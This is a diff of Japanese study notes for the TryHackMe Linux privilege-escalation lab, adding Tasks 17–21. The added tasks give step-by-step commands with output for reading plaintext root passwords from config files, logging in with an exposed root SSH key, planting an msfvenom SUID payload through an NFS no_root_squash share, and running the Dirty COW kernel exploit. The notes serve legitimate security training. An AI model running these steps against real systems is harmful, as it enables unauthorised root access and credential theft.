@@ -2,7 +2,7 @@
 
 > **ルーム:** [Linux PrivEsc](https://tryhackme.com/room/linprivesc)
 > **学習日:** 2026-05-24 〜
-> **進捗:** Task 1〜16 完了（76%）
+> **進捗:** Task 1〜21 完了（100%）✅ ルームクリア
 > **初期認証情報:** `user:password321`（SSH接続可）
 
 ---
@@ -989,9 +989,257 @@ cat /dev/null > ~/.bash_history  # ファイルを空にする
 
 ---
 
-## 次回の予定
+## Task 17: Passwords & Keys - Config Files
 
-Task 17: Passwords & Keys - Config Files から再開
+### 概要
+
+設定ファイル（Config Files）に平文のパスワードや、別の認証情報ファイルへの参照が含まれているケースを悪用する。
+
+### 手順
+
+```bash
+# ホームディレクトリに VPN 設定ファイルを発見
+ls /home/user
+# → myvpn.ovpn
+
+# 設定ファイルの中身を読む（先に読んでから行動）
+cat /home/user/myvpn.ovpn
+# → auth-user-pass /etc/openvpn/auth.txt  ← 認証情報ファイルへの参照
+
+# 参照先の認証情報ファイルを確認
+cat /etc/openvpn/auth.txt
+# → root ユーザーのパスワードが平文で記録されている
+
+# 発見したパスワードで昇格
+su root
+# root@debian:/home/user# → root権限取得
+```
+
+### 今回の失敗：読む前に打つ
+
+`cat myvpn.ovpn` の出力を読む前に `su root` を実行し、「Authentication failure」となった。設定ファイルの内容を読んでから行動を組み立てる順序が正しい。実戦でのログイン失敗はアラートを引き起こすため、この「撃ってから狙う」習慣は致命的。
+
+### 調査すべき設定ファイルの例
+
+| ファイル・パス | 含まれる可能性のある情報 |
+|-------------|----------------------|
+| `*.ovpn` | VPN認証情報へのパス |
+| `/etc/openvpn/auth.txt` | VPNのID/パスワード |
+| `*.conf` | DBやサービスの接続情報 |
+| `wp-config.php` | WordPressのDBパスワード |
+| `.env` | アプリケーション設定の認証情報 |
+
+---
+
+## Task 18: Passwords & Keys - SSH Keys
+
+### 概要
+
+管理者がバックアップしたSSH秘密鍵を **不適切なパーミッション（world-readable）** で放置しているケースを悪用する。
+
+### 手順
+
+```bash
+# ルートディレクトリに隠しディレクトリがないか確認
+ls -la /
+# → drwxr-xr-x ... /.ssh  ← 隠しディレクトリを発見
+
+# 中身を確認
+ls -l /.ssh
+# → -rw-r--r-- 1 root root ... root_key  ← 誰でも読める秘密鍵！
+
+# 秘密鍵の内容をコピーし、AttackBox側にファイルとして保存
+cat /.ssh/root_key
+```
+
+```bash
+# AttackBox 上で実行
+
+# パーミッションを厳格化（SSHクライアントの要件）
+chmod 600 root_key
+
+# 秘密鍵でrootとしてSSHログイン
+ssh -i root_key -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa root@[ターゲットIP]
+# root@debian:~# → root権限取得
+```
+
+### SSH秘密鍵のパーミッション要件
+
+```
+chmod 600 → -rw-------  所有者のみ読み書き可能  ← 必須
+chmod 644 → -rw-r--r--  他人も読める            ← SSHが拒否（bad permissions）
+
+エラーメッセージ:
+"WARNING: UNPROTECTED PRIVATE KEY FILE!"
+"Permissions 0644 for 'root_key' are too open."
+```
+
+秘密鍵は「所有者以外に一切のアクセス権限がないこと」がSSHの絶対条件。ファイルを見つけただけでは使えず、適切な権限設定がセットで必要。
+
+---
+
+## Task 19: NFS
+
+### 概要
+
+NFS（Network File System）の `no_root_squash` 設定ミスを悪用する。  
+攻撃者マシンでroot権限でNFS共有フォルダにSUIDファイルを書き込み、ターゲット側で実行してroot権限を奪取する。
+
+### NFS の Root Squashing とは
+
+```
+【通常: root_squash（デフォルト）】
+AttackBoxのroot → NFS共有へ書き込み → ターゲット上ではnobody扱い
+                                                ↑
+                              "外部のrootを信用しない"という安全機能
+
+【脆弱: no_root_squash】
+AttackBoxのroot → NFS共有へ書き込み → ターゲット上でもroot扱い
+                                                ↑
+                              攻撃者のrootがそのまま通ってしまう！
+```
+
+### 手順
+
+```bash
+# ターゲットマシン（user@debian）で NFS 設定を確認
+cat /etc/exports
+# → /tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
+```
+
+```bash
+# AttackBox 上で実行（rootとして操作）
+
+# NFS共有をマウント
+mkdir /tmp/nfs
+mount -o rw,vers=3 [ターゲットIP]:/tmp /tmp/nfs
+
+# SUID付きのペイロードを生成してマウントフォルダに配置
+msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
+
+# 実行権限とSUIDビットを付与（rootとして操作するのでそのまま有効）
+chmod +xs /tmp/nfs/shell.elf
+```
+
+```bash
+# ターゲットマシン（user@debian）で
+/tmp/shell.elf
+# bash-4.1# → euid=0(root)
+```
+
+### クリーンアップ
+
+```bash
+# ターゲット側
+rm /tmp/shell.elf
+exit
+
+# AttackBox 側
+umount /tmp/nfs
+rmdir /tmp/nfs
+```
+
+---
+
+## Task 20: Kernel Exploits
+
+### 概要
+
+カーネルのバグを直接突く手法。他の設定ミスやファイル権限の問題がない場合の「最後の手段」。  
+カーネルエクスプロイトはシステムを不安定にする危険があるため、実戦では他の手法を全て試してから使う。
+
+### Dirty COW（CVE-2016-5195）
+
+```bash
+# カーネルバージョンに対応するエクスプロイト候補を列挙
+perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl
+# → [3] dirty_cow  CVE-2016-5195 ← 今回のターゲット
+
+# エクスプロイトをコンパイルして実行
+gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
+./c0w
+# → /usr/bin/passwd を rootシェル起動コードに置き換える
+
+# 書き換えた passwd を実行してrootシェルを取得
+/usr/bin/passwd
+# root@debian:/home/user# → root権限取得
+```
+
+### Dirty COW の仕組み
+
+Linux カーネルの「Copy-on-Write（COW）」メモリ管理の競合状態（Race Condition）を突く。
+
+```
+通常:
+  読み取り専用ファイル → 書き込み試行 → カーネルがコピーを作成して書き込ませる（原本を守る）
+
+Dirty COW:
+  「書き込む」処理 と 「コピーを破棄（madvise）」処理 を高速で並行実行
+  → カーネルを混乱させ、コピーではなく原本（読み取り専用）に直接書き込んでしまう
+  → SUID付きの /usr/bin/passwd を書き換え → rootシェル起動
+```
+
+### クリーンアップ（必須・緊急）
+
+```bash
+# /usr/bin/passwd を元に戻す（これを怠るとパスワード変更が使えなくなる）
+mv /tmp/bak /usr/bin/passwd
+exit
+```
+
+---
+
+## Task 21: Privilege Escalation Scripts
+
+### 概要
+
+特権昇格の調査を自動化する列挙ツールを実行し、これまで手作業で発見してきた脆弱性がどのように検出されるかを確認する。
+
+### 用意されている3つのツール
+
+| ツール | 特徴 |
+|-------|------|
+| `linpeas.sh` | 最も詳細・最もポピュラー。カラー表示で危険度を色分け |
+| `LinEnum.sh` | シンプルで読みやすい出力。古いが信頼性が高い |
+| `lse.sh` | インタラクティブな詳細度設定が可能 |
+
+### linpeas.sh の出力で確認できた主な脆弱性
+
+今回のルームで手作業で発見したものと対照:
+
+| linpeas が検出した項目 | 対応するタスク |
+|----------------------|-------------|
+| writable `/etc/passwd`, `/etc/shadow` | Task 4・5 |
+| SUID: `suid-so`, `suid-env`, `suid-env2` | Task 12・13・14・15 |
+| SUID: `/usr/sbin/exim-4.84-3` | Task 11 |
+| NFS `/tmp` に `no_root_squash` | Task 19 |
+| `.bash_history` にMySQLコマンドのパスワード | Task 16 |
+| `auth-user-pass /etc/openvpn/auth.txt` | Task 17 |
+| `/.ssh` ディレクトリ（unexpected folder in root） | Task 18 |
+| writable `/usr/local/bin/overwrite.sh` | Task 8 |
+
+### なぜツールを最後に使うのか
+
+ツールの出力は「答え」ではなく「兆候（ヒント）」の羅列。大量の出力から「SUIDの相対パスミス」や「NFS の no_root_squash」といった本物の急所を見抜き、エクスプロイトを組み立てられるのは、各脆弱性の仕組みを手作業で理解した人間だけ。  
+**基礎なき者に強力なツールを渡しても、ノイズの海で溺れるだけ。**
+
+---
+
+## ルーム完了
+
+全21タスクのすべての手法を制覇した。
+
+| 分類 | 手法 | Task |
+|-----|-----|------|
+| サービス脆弱性 | MySQL UDF でSUIDバックドア作成 | 2 |
+| ファイル権限 | /etc/shadow 読み取り→クラック、書き込み→上書き、/etc/passwd 追記 | 3・4・5 |
+| sudo 悪用 | シェルエスケープ、LD_PRELOAD/LD_LIBRARY_PATH | 6・7 |
+| Cron 悪用 | ファイル権限、PATH、ワイルドカード | 8・9・10 |
+| SUID/SGID 悪用 | 既知CVE、共有ライブラリ注入、環境変数、Bash関数/PS4 | 11〜15 |
+| パスワード・鍵 | 履歴ファイル、設定ファイル、SSH秘密鍵 | 16・17・18 |
+| NFS | no_root_squash 悪用 | 19 |
+| カーネル | Dirty COW（Race Condition） | 20 |
+| 自動化ツール | linpeas/LinEnum/lse で全網羅 | 21 |
 
 ---
 
